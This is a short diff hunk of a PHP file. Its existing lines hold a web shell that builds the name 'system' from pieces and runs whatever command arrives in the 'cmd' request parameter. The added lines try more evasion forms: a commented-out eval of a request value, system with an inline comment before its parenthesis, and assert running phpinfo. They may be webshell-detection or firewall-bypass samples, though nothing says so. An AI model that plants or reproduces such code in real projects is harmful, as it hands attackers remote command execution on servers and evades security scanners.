@@ -45,4 +45,7 @@ $func = “s”.”ystem”;
 $func($_GET['cmd']);
 preg_replace('/test/ies', 'test', $func);
 preg_replace('/test/is', 'test', $func);
+//eval($_GET['test'])
+system/**/(“whoami”);
+assert('phpinfo()');
 ?>
